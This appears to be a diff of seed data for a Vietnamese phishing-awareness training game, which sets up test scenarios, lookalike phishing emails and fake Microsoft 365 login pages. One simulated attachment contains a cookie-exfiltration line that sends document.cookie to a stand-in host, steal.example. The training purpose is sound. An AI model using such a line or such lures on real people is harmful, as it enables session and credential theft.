@@ -1,13 +1,22 @@
 package com.example.cybershield.config;
 
-import com.example.cybershield.entity.*;
-import com.example.cybershield.repository.*;
+import com.example.cybershield.entity.Badge;
+import com.example.cybershield.entity.LandingPage;
+import com.example.cybershield.entity.Scenario;
+import com.example.cybershield.entity.ScenarioStep;
+import com.example.cybershield.entity.User;
+import com.example.cybershield.entity.VirtualInboxEmail;
+import com.example.cybershield.repository.BadgeRepository;
+import com.example.cybershield.repository.LandingPageRepository;
+import com.example.cybershield.repository.ScenarioRepository;
+import com.example.cybershield.repository.ScenarioStepRepository;
+import com.example.cybershield.repository.UserRepository;
+import com.example.cybershield.repository.VirtualInboxEmailRepository;
 import lombok.RequiredArgsConstructor;
 import org.springframework.boot.CommandLineRunner;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Component;
 
-import java.time.LocalDateTime;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -19,9 +28,7 @@ public class DataInitializer implements CommandLineRunner {
     private final ScenarioRepository scenarioRepository;
     private final ScenarioStepRepository scenarioStepRepository;
     private final LandingPageRepository landingPageRepository;
-    private final TrainingSessionRepository trainingSessionRepository;
-    private final SessionDetailRepository sessionDetailRepository;
-    private final DataLeakRepository dataLeakRepository;
+    private final VirtualInboxEmailRepository virtualInboxEmailRepository;
     private final BadgeRepository badgeRepository;
     private final PasswordEncoder passwordEncoder;
 
@@ -30,38 +37,12 @@ public class DataInitializer implements CommandLineRunner {
         User admin = ensureAdminUser();
         User player = ensurePlayerUser();
 
-        List<Scenario> scenarios = ensureScenarios();
-        ensureScenarioStepsAndLandingPages(scenarios);
-        ensureTrainingProgress(player, scenarios);
+        List<Scenario> scenarios = seedFlowScenarios();
+        seedFlowSteps(scenarios);
+        seedFlowInboxEmails();
         ensureBadges();
 
-        System.out.println("✅ Seed Data hoàn tất. Admin: " + admin.getUsername() + ", Player: " + player.getUsername());
-    }
-
-    private void ensureBadges() {
-        if (badgeRepository.count() > 0) return;
-
-        List<Badge> badges = new ArrayList<>();
-        badges.add(buildBadge(1, "Sắt - Tân Binh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank1_S%E1%BA%AFt_l9tft7.png", 0));
-        badges.add(buildBadge(2, "Đồng - Thám Tử Số", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank2_%C4%90%E1%BB%93ng_obqlkf.png", 500));
-        badges.add(buildBadge(3, "Bạc - Chuyên Viên", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank3_B%E1%BA%A1c_yiylke.png", 1500));
-        badges.add(buildBadge(4, "Bạch Kim - Tinh Anh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank5_B%E1%BA%A1chKim_m52r0q.png", 6000));
-        badges.add(buildBadge(5, "Lục Bảo - Chuyên Gia", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank6_L%E1%BB%A5cB%E1%BA%A3o_sytkat.png", 10000));
-        badges.add(buildBadge(6, "Kim Cương - Huyền Thoại", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208171/Rank7_KimC%C6%B0%C6%A1ng_kuore7.png", 20000));
-        badges.add(buildBadge(7, "Cao Thủ - Bức Tường Lửa", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank8_CaoTh%E1%BB%A7_bwchpp.png", 40000));
-        badges.add(buildBadge(8, "Thách Đấu - Cyber Overlord", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208176/Rank9_Th%C3%A1ch%C4%90%E1%BA%A5u_i2svwp.png", 75000));
-
-        badgeRepository.saveAll(badges);
-        System.out.println("✅ Khởi tạo thành công dữ liệu Hệ thống Huy hiệu (Ranks)!");
-    }
-
-    private Badge buildBadge(int id, String name, String iconUrl, int requiredExp) {
-        Badge badge = new Badge();
-        badge.setId(id);
-        badge.setName(name);
-        badge.setIconUrl(iconUrl);
-        badge.setRequiredExp(requiredExp);
-        return badge;
+        System.out.println("Seed Data hoan tat. Admin: " + admin.getUsername() + ", Player: " + player.getUsername());
     }
 
     private User ensureAdminUser() {
@@ -96,263 +77,217 @@ public class DataInitializer implements CommandLineRunner {
         });
     }
 
-    private List<Scenario> ensureScenarios() {
-        if (scenarioRepository.count() > 0) {
-            return scenarioRepository.findAll();
-        }
+    private void ensureBadges() {
+        if (badgeRepository.count() > 0) return;
+
+        List<Badge> badges = new ArrayList<>();
+        badges.add(buildBadge(1, "Sat - Tan Binh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank1_S%E1%BA%AFt_l9tft7.png", 0));
+        badges.add(buildBadge(2, "Dong - Tham Tu So", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank2_%C4%90%E1%BB%93ng_obqlkf.png", 500));
+        badges.add(buildBadge(3, "Bac - Chuyen Vien", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank3_B%E1%BA%A1c_yiylke.png", 1500));
+        badges.add(buildBadge(4, "Bach Kim - Tinh Anh", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank5_B%E1%BA%A1chKim_m52r0q.png", 6000));
+        badges.add(buildBadge(5, "Luc Bao - Chuyen Gia", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207808/Rank6_L%E1%BB%A5cB%E1%BA%A3o_sytkat.png", 10000));
+        badges.add(buildBadge(6, "Kim Cuong - Huyen Thoai", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208171/Rank7_KimC%C6%B0%C6%A1ng_kuore7.png", 20000));
+        badges.add(buildBadge(7, "Cao Thu - Buc Tuong Lua", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775207809/Rank8_CaoTh%E1%BB%A7_bwchpp.png", 40000));
+        badges.add(buildBadge(8, "Thach Dau - Cyber Overlord", "https://res.cloudinary.com/drdim9z1v/image/upload/v1775208176/Rank9_Th%C3%A1ch%C4%90%E1%BA%A5u_i2svwp.png", 75000));
+        badgeRepository.saveAll(badges);
+    }
+
+    private Badge buildBadge(int id, String name, String iconUrl, int requiredExp) {
+        Badge badge = new Badge();
+        badge.setId(id);
+        badge.setName(name);
+        badge.setIconUrl(iconUrl);
+        badge.setRequiredExp(requiredExp);
+        return badge;
+    }
+
+    private List<Scenario> seedFlowScenarios() {
+        if (scenarioRepository.count() > 0) return scenarioRepository.findAll();
 
         List<Scenario> scenarios = new ArrayList<>();
-        scenarios.add(createScenario(
-                "Chiến dịch 1: Sơ hở từ hòm thư",
-                "Mass Phishing",
-                "Easy",
-                "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80",
-                "Nhận diện chiến dịch phishing đại trà qua lỗi chính tả, domain lạ và CTA khẩn cấp.",
-                300
-        ));
-        scenarios.add(createScenario(
-                "Chiến dịch 2: Cuộc gọi từ \"Ngân hàng\"",
-                "Brand Spoofing",
-                "Medium",
-                "https://images.unsplash.com/photo-1563013544-824ae1b704d3?auto=format&fit=crop&w=1200&q=80",
-                "Xử lý tình huống mạo danh thương hiệu ngân hàng, kết hợp email + landing giả.",
-                450
-        ));
-        scenarios.add(createScenario(
-                "Chiến dịch 3: Tài liệu mật phòng HR",
-                "Spear Phishing",
-                "Medium",
-                "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&w=1200&q=80",
-                "Phân tích thư nhắm mục tiêu cá nhân hóa, đính kèm tài liệu độc hại.",
-                500
-        ));
-        scenarios.add(createScenario(
-                "Chiến dịch 4: Chỉ thị khẩn cấp từ CEO",
-                "Whaling/BEC",
-                "Hard",
-                "https://images.unsplash.com/photo-1552664730-d307ca884978?auto=format&fit=crop&w=1200&q=80",
-                "Ngăn chặn tấn công BEC cấp quản trị với yêu cầu chuyển tiền/tiết lộ dữ liệu.",
-                700
-        ));
-        scenarios.add(createScenario(
-                "Chiến dịch 5: Chuỗi cung ứng bị tấn công",
-                "Advanced Evasion",
-                "Hard",
-                "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80",
-                "Mô phỏng chuỗi tấn công nhiều tầng, né tránh phát hiện bằng domain gần giống và kỹ thuật social engineering.",
-                850
-        ));
-
+        scenarios.add(createScenario("Flow Test 1: MAIL", "MAIL_STANDARD", "Easy", "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu email text co ban.", 250));
+        scenarios.add(createScenario("Flow Test 2: MAIL + FILE", "MAIL_FILE", "Easy", "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu email co file dinh kem dang ngo.", 300));
+        scenarios.add(createScenario("Flow Test 3: MAIL + WEB", "MAIL_WEB", "Medium", "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu click link mo browser gia.", 400));
+        scenarios.add(createScenario("Flow Test 4: MAIL + OTP", "MAIL_OTP", "Medium", "https://images.unsplash.com/photo-1563013544-824ae1b704d3?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu phishing OTP.", 450));
+        scenarios.add(createScenario("Flow Test 5: MAIL + ZALO", "MAIL_ZALO", "Hard", "https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80", "Luong kiem thu social engineering da kenh.", 500));
         return scenarioRepository.saveAll(scenarios);
     }
 
-    private Scenario createScenario(
-            String title,
-            String category,
-            String difficulty,
-            String thumbnailUrl,
-            String description,
-            int rewardExp
-    ) {
+    private Scenario createScenario(String title, String category, String difficulty, String thumbnail, String description, int rewardExp) {
         Scenario scenario = new Scenario();
         scenario.setTitle(title);
         scenario.setCategory(category);
         scenario.setDifficulty(difficulty);
-        scenario.setThumbnailUrl(thumbnailUrl);
+        scenario.setThumbnailUrl(thumbnail);
         scenario.setDescription(description);
         scenario.setRewardExp(rewardExp);
         return scenario;
     }
 
-    private void ensureScenarioStepsAndLandingPages(List<Scenario> scenarios) {
-        if (scenarioStepRepository.count() > 0) return;
-        if (scenarios.isEmpty()) return;
+    private void seedFlowSteps(List<Scenario> scenarios) {
+        if (scenarios.size() < 5) return;
 
-        // Scenario 1: Sơ hở từ hòm thư (Mass Phishing)
-        if (scenarios.size() >= 1) {
-            Scenario s1 = scenarios.get(0);
-            ScenarioStep s1Step1 = saveStep(
-                    s1, 1, "MAIL",
-                    "{\"title\":\"Nhận diện Email giả mạo đại trà\",\"threatLevel\":1,\"from\":\"promo@m1crosoft-support.com\",\"subject\":\"Nhận quà 999.000đ trong 5 phút\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 1 (Threat 1): Nhận diện email đại trà với dấu hiệu giục bấm link gấp."
-            );
-            ScenarioStep s1Step2 = saveStep(
-                    s1, 2, "WEB_PAGE",
-                    "{\"title\":\"Kiểm tra Link ẩn dưới nút bấm\",\"threatLevel\":2,\"buttonText\":\"Xác nhận tài khoản ngay\",\"hoverHint\":\"URL thật khác domain chính thức\"}",
-                    "INPUT", "REPORT",
-                    "Bài 2 (Threat 2): Hover kiểm tra URL đích trước khi thao tác."
-            );
-            landingPageRepository.save(buildLanding(s1Step2, s1.getTitle()));
-        }
-
-        // Scenario 2: Cuộc gọi từ Ngân hàng (Brand Spoofing)
-        if (scenarios.size() >= 2) {
-            Scenario s2 = scenarios.get(1);
-            ScenarioStep s2Step1 = saveStep(
-                    s2, 1, "MAIL",
-                    "{\"title\":\"Cảnh giác với Email cảnh báo khóa tài khoản\",\"threatLevel\":2,\"from\":\"security@v1etcombank-alert.com\",\"subject\":\"Tài khoản sẽ bị khóa sau 10 phút\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 1 (Threat 2): Email mạo danh thương hiệu ngân hàng nhằm tạo hoảng loạn."
-            );
-            ScenarioStep s2Step2 = saveStep(
-                    s2, 2, "WEB_PAGE",
-                    "{\"title\":\"Phân tích Landing Page giả mạo ngân hàng\",\"threatLevel\":3,\"fakeBrand\":\"VCB Secure Login\",\"hint\":\"Sai chứng chỉ + domain lệch\"}",
-                    "INPUT", "REPORT",
-                    "Bài 2 (Threat 3): So khớp giao diện và domain thật/giả trước khi đăng nhập."
-            );
-            ScenarioStep s2Step3 = saveStep(
-                    s2, 3, "OTP",
-                    "{\"title\":\"Phòng thủ yêu cầu cung cấp mã OTP\",\"threatLevel\":3,\"message\":\"Nhập OTP để hủy giao dịch lạ\"}",
-                    "INPUT", "REPORT",
-                    "Bài 3 (Threat 3): Tuyệt đối không chia sẻ OTP qua bất kỳ kênh nào."
-            );
-            landingPageRepository.save(buildLanding(s2Step2, s2.getTitle()));
-        }
-
-        // Scenario 3: Tài liệu mật phòng HR (Spear Phishing)
-        if (scenarios.size() >= 3) {
-            Scenario s3 = scenarios.get(2);
-            saveStep(
-                    s3, 1, "MAIL",
-                    "{\"title\":\"Thư thông báo tăng lương bất thường\",\"threatLevel\":3,\"from\":\"hr-benefits@company-payroll.net\",\"subject\":\"Điều chỉnh lương bí mật Q2\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 1 (Threat 3): Nội dung cá nhân hóa cao nhưng có yêu cầu mở tài liệu đáng ngờ."
-            );
-            saveStep(
-                    s3, 2, "MAIL",
-                    "{\"title\":\"Soi kỹ email nội bộ bị fake (Typosquatting)\",\"threatLevel\":4,\"from\":\"ceo@cornpany.com\",\"subject\":\"Tài liệu nhân sự tuyệt mật\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 2 (Threat 4): Typosquatting tinh vi ở domain nội bộ (company vs cornpany)."
-            );
-        }
-
-        // Scenario 4: Chỉ thị khẩn cấp từ CEO (BEC/Whaling)
-        if (scenarios.size() >= 4) {
-            Scenario s4 = scenarios.get(3);
-            saveStep(
-                    s4, 1, "MAIL",
-                    "{\"title\":\"Áp lực thời gian từ cấp trên\",\"threatLevel\":4,\"from\":\"ceo.office@corp-management.co\",\"subject\":\"Xử lý khẩn trong 15 phút\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 1 (Threat 4): Kẻ tấn công dùng authority + urgency để ép bỏ qua quy trình."
-            );
-            saveStep(
-                    s4, 2, "OTP",
-                    "{\"title\":\"Yêu cầu chuyển khoản bỏ qua quy trình\",\"threatLevel\":5,\"message\":\"Chuyển khoản ngay, gửi mã xác thực cho tôi\"}",
-                    "INPUT", "REPORT",
-                    "Bài 2 (Threat 5): BEC/Whaling yêu cầu hành động tài chính không qua kênh xác minh chuẩn."
-            );
-        }
-
-        // Scenario 5: Chuỗi cung ứng bị tấn công (giữ riêng dữ liệu để không trùng chiến dịch khác)
-        if (scenarios.size() >= 5) {
-            Scenario s5 = scenarios.get(4);
-            ScenarioStep s5Step1 = saveStep(
-                    s5, 1, "MAIL",
-                    "{\"title\":\"Thông báo cập nhật hệ thống từ nhà cung cấp\",\"threatLevel\":4,\"from\":\"vendor-update@trusted-supplier.support\",\"subject\":\"Patch bắt buộc hôm nay\"}",
-                    "CLICK_LINK", "REPORT",
-                    "Bài 1: Chuỗi cung ứng thường giả mạo vendor để phát tán liên kết độc."
-            );
-            ScenarioStep s5Step2 = saveStep(
-                    s5, 2, "WEB_PAGE",
-                    "{\"title\":\"Cổng tải file giả mạo\",\"threatLevel\":5,\"hint\":\"Trang tải file yêu cầu login lại bằng tài khoản nội bộ\"}",
-                    "INPUT", "REPORT",
-                    "Bài 2: Không đăng nhập lại trên cổng tải file không thuộc hệ thống chuẩn."
-            );
-            ScenarioStep s5Step3 = saveStep(
-                    s5, 3, "ZALO",
-                    "{\"title\":\"Tin nhắn follow-up xác nhận OTP\",\"threatLevel\":5,\"sender\":\"IT Helpdesk Clone\"}",
-                    "INPUT", "REPORT",
-                    "Bài 3: Kết hợp đa kênh để ép người dùng tiết lộ OTP/token."
-            );
-            landingPageRepository.save(buildLanding(s5Step2, s5.getTitle()));
-        }
+        upsertStep(scenarios.get(0), 1, "MAIL", "{\"scenarioType\":\"MAIL_STANDARD\",\"title\":\"MAIL co ban\",\"threatLevel\":1}", "CLICK_LINK", "REPORT", "Flow MAIL");
+        upsertStep(scenarios.get(1), 1, "MAIL", "{\"scenarioType\":\"MAIL_FILE\",\"title\":\"MAIL + FILE\",\"threatLevel\":2}", "CLICK_LINK", "REPORT", "Flow MAIL+FILE");
+        ScenarioStep webStep = upsertStep(scenarios.get(2), 1, "WEB_PAGE", "{\"scenarioType\":\"MAIL_WEB\",\"title\":\"MAIL + WEB\",\"traps\":{\"browser\":{\"enabled\":true,\"title\":\"Microsoft 365 Security Check\",\"displayUrl\":\"https://login.microsoftonline.com-security-check.com/verify\",\"actualUrl\":\"https://login.microsoftonline.com-security-check.com/verify\",\"formType\":\"CREDENTIAL\"}},\"threatLevel\":3}", "INPUT", "REPORT", "Flow MAIL+WEB");
+        landingPageRepository.save(buildLanding(webStep, scenarios.get(2).getTitle()));
+        upsertStep(scenarios.get(3), 1, "MAIL_OTP", "{\"scenarioType\":\"MAIL_OTP\",\"otpCode\":\"123456\",\"title\":\"MAIL + OTP\",\"message\":\"OTP hien thi trong email.\",\"threatLevel\":4}", "INPUT", "REPORT", "Flow MAIL+OTP");
+        upsertStep(scenarios.get(4), 1, "ZALO", "{\"scenarioType\":\"MAIL_ZALO\",\"title\":\"MAIL + ZALO\",\"sender\":\"IT Helpdesk Clone\",\"messages\":[{\"sender\":\"IT Helpdesk Clone\",\"text\":\"Check mail va duyet gap giup anh.\"}],\"threatLevel\":5}", "INPUT", "REPORT", "Flow MAIL+ZALO");
     }
 
-    private ScenarioStep saveStep(
-            Scenario scenario,
-            int stepOrder,
-            String stepType,
-            String content,
-            String triggerFailure,
-            String triggerSuccess,
-            String feedback
-    ) {
-        return scenarioStepRepository.save(buildStep(
-                scenario,
-                stepOrder,
-                stepType,
-                content,
-                triggerFailure,
-                triggerSuccess,
-                feedback
-        ));
-    }
-
-    private ScenarioStep buildStep(
-            Scenario scenario,
-            int stepOrder,
-            String stepType,
-            String content,
-            String triggerFailure,
-            String triggerSuccess,
-            String feedback
-    ) {
-        ScenarioStep step = new ScenarioStep();
+    private ScenarioStep upsertStep(Scenario scenario, int order, String type, String content, String triggerFailure, String triggerSuccess, String hint) {
+        ScenarioStep step = scenarioStepRepository.findByScenarioIdOrderByStepOrderAsc(scenario.getId())
+                .stream()
+                .filter(existing -> existing.getStepOrder() == order)
+                .findFirst()
+                .orElseGet(ScenarioStep::new);
         step.setScenario(scenario);
-        step.setStepOrder(stepOrder);
-        step.setStepType(stepType);
+        step.setStepOrder(order);
+        step.setStepType(type);
         step.setContent(content);
         step.setTriggerFailure(triggerFailure);
         step.setTriggerSuccess(triggerSuccess);
-        step.setAiFeedback(feedback);
-        return step;
+        step.setAiFeedback(hint);
+        return scenarioStepRepository.save(step);
+    }
+
+    private void seedFlowInboxEmails() {
+        for (Scenario scenario : scenarioRepository.findAll()) {
+            for (ScenarioStep step : scenarioStepRepository.findByScenarioIdOrderByStepOrderAsc(scenario.getId())) {
+                List<VirtualInboxEmail> existingEmails = virtualInboxEmailRepository.findByScenarioStep_IdOrderBySortOrderAsc(step.getId());
+                if (!existingEmails.isEmpty()) {
+                    virtualInboxEmailRepository.deleteAll(existingEmails);
+                }
+                virtualInboxEmailRepository.saveAll(buildInboxForStep(step));
+            }
+        }
+    }
+
+    private List<VirtualInboxEmail> buildInboxForStep(ScenarioStep step) {
+        String content = step.getContent() == null ? "" : step.getContent();
+        List<VirtualInboxEmail> emails = new ArrayList<>();
+        if (content.contains("\"scenarioType\":\"MAIL_FILE\"")) {
+            emails.add(buildInboxEmail(
+                    step,
+                    1,
+                    "PHISH",
+                    true,
+                    "it-helpdesk@secure-portal365.com",
+                    "IT Helpdesk",
+                    "Bat buoc cap nhat plugin bao mat ngay hom nay",
+                    "He thong yeu cau cap nhat plugin moi. Vui long tai file dinh kem va chay truoc 17:00.",
+                    "#",
+                    "Tai tep",
+                    "{\"fileName\":\"SecurityPatch_2026.js\",\"mimeLabel\":\"JavaScript\",\"viewerTitle\":\"Notepad\",\"content\":\"fetch('http://steal.example/log?c='+document.cookie)\",\"fileWarnings\":[\"File script tu domain la\",\"Yeu cau chay file truc tiep\"]}",
+                    List.of("Nguoi gui la domain ngoai", "Yeu cau chay file .js khan cap")
+            ));
+            emails.add(buildInboxEmail(
+                    step,
+                    2,
+                    "LEGIT",
+                    false,
+                    "hr@cybershield.internal",
+                    "HR Department",
+                    "Thong bao lich dao tao quy 2",
+                    "Thong bao lich dao tao noi bo. Khong can tai them tep nao.",
+                    "https://intranet.cybershield.internal/training",
+                    "Mo intranet",
+                    null,
+                    List.of()
+            ));
+            return emails;
+        }
+
+        if (content.contains("\"scenarioType\":\"MAIL_WEB\"")) {
+            emails.add(buildInboxEmail(
+                    step,
+                    1,
+                    "PHISH",
+                    true,
+                    "security-alert@micr0soft-support365.com",
+                    "Microsoft 365 Security",
+                    "[Khẩn] Tài khoản công ty sắp bị tạm khóa",
+                    "Hệ thống ghi nhận đăng nhập bất thường vào Microsoft 365. Vui lòng xác minh lại tài khoản trong vòng 15 phút để tránh gián đoạn email/Teams.",
+                    "https://login.microsoftonline.com-security-check.com/verify",
+                    "Xác minh tài khoản",
+                    null,
+                    List.of(
+                            "Domain người gửi không phải microsoft.com",
+                            "Link đăng nhập có domain gần giống (typosquatting)",
+                            "Tạo áp lực thời gian 15 phút để ép nhập mật khẩu"
+                    )
+            ));
+            emails.add(buildInboxEmail(
+                    step,
+                    2,
+                    "LEGIT",
+                    false,
+                    "it-notify@cybershield.internal",
+                    "IT Operations",
+                    "Nhắc nhở bảo mật: không nhập mật khẩu vào trang lạ",
+                    "Đội IT nội bộ nhắc lại: chỉ đăng nhập tại cổng chính thức login.microsoftonline.com và luôn kiểm tra kỹ domain trước khi nhập mật khẩu.",
+                    "https://learn.microsoft.com/en-us/security/",
+                    "Xem hướng dẫn bảo mật",
+                    null,
+                    List.of()
+            ));
+            return emails;
+        }
+
+        emails.add(buildInboxEmail(
+                step,
+                1,
+                "PHISH",
+                true,
+                "admin@free-gifts.xyz",
+                "Khuyen mai",
+                "Canh bao / Khuyen mai",
+                "Noi dung email test phishing",
+                "http://free-gifts.xyz/claim",
+                "Mo link",
+                null,
+                List.of("Domain la")
+        ));
+        emails.add(buildInboxEmail(
+                step,
+                2,
+                "LEGIT",
+                false,
+                "hr@cybershield.internal",
+                "HR",
+                "Thong bao noi bo",
+                "Noi dung email noi bo",
+                "https://intranet.cybershield.internal",
+                "Mo intranet",
+                null,
+                List.of()
+        ));
+        return emails;
+    }
+
+    private VirtualInboxEmail buildInboxEmail(ScenarioStep step, int queueOrder, String mailType, boolean phishing, String fromEmail, String fromName, String subject, String body, String linkUrl, String ctaLabel, String attachmentJson, List<String> redFlags) {
+        VirtualInboxEmail email = new VirtualInboxEmail();
+        email.setScenarioStep(step);
+        email.setSortOrder(queueOrder);
+        email.setSlotTag(mailType);
+        email.setPhishing(phishing);
+        email.setSenderEmail(fromEmail);
+        email.setSenderName(fromName);
+        email.setSubject(subject);
+        email.setBody(body);
+        email.setLinkUrl(linkUrl);
+        email.setLinkLabel(ctaLabel);
+        email.setAttachmentJson(attachmentJson);
+        email.setRedFlags(redFlags == null ? List.of() : redFlags);
+        return email;
     }
 
     private LandingPage buildLanding(ScenarioStep step, String scenarioTitle) {
         LandingPage landing = new LandingPage();
         landing.setStep(step);
-        landing.setTemplateName("PhishingTemplate-" + step.getStepOrder());
+        landing.setTemplateName("FlowTestTemplate-" + step.getStepOrder());
         landing.setFakeUrl("https://secure-" + scenarioTitle.toLowerCase().replace(" ", "-") + ".verify-login.net");
         landing.setRequiredFields("[\"username\",\"password\",\"otp\"]");
         return landing;
-    }
-
-    private void ensureTrainingProgress(User player, List<Scenario> scenarios) {
-        if (trainingSessionRepository.count() > 0) return;
-
-        for (int i = 0; i < scenarios.size(); i++) {
-            Scenario scenario = scenarios.get(i);
-            TrainingSession session = new TrainingSession();
-            session.setUser(player);
-            session.setScenario(scenario);
-            session.setStartedAt(LocalDateTime.now().minusDays(5L - i));
-            session.setEndedAt(LocalDateTime.now().minusDays(5L - i).plusMinutes(12));
-            session.setScoreGained(200 + i * 75);
-            session.setStatus(i < 3 ? "COMPLETED" : "FAILED");
-            trainingSessionRepository.save(session);
-
-            List<ScenarioStep> steps = scenarioStepRepository.findByScenarioIdOrderByStepOrderAsc(scenario.getId());
-            for (ScenarioStep step : steps) {
-                SessionDetail detail = new SessionDetail();
-                detail.setSession(session);
-                detail.setStep(step);
-                boolean correct = i < 3 || step.getStepOrder() < 3;
-                detail.setCorrect(correct);
-                detail.setUserAction(correct ? "REPORT" : "CLICK_LINK");
-                detail.setResponseTime(0.9f + step.getStepOrder() * 0.2f);
-                sessionDetailRepository.save(detail);
-            }
-
-            if (i >= 3) {
-                DataLeak leak = new DataLeak();
-                leak.setUser(player);
-                leak.setSession(session);
-                leak.setDataType("OTP");
-                leak.setLeakedValue("******");
-                leak.setLeakedAt(LocalDateTime.now().minusDays(4L - i));
-                dataLeakRepository.save(leak);
-            }
-        }
     }
 }
